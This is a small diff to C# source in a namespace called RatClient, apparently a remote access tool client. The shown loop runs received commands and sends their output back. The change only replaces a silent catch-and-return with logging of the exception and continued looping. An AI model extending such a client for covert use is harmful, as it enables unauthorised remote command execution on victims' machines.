@@ -150,10 +150,10 @@ namespace RatClient
                     byte[] output = filter.Run(command);
                     SendMsg(output);
                 }
-                catch
-                {
-                    return;
-                }
+				catch (Exception ex)
+				{
+					Console.WriteLine(ex.Message);
+				}
             }                
         }
     }
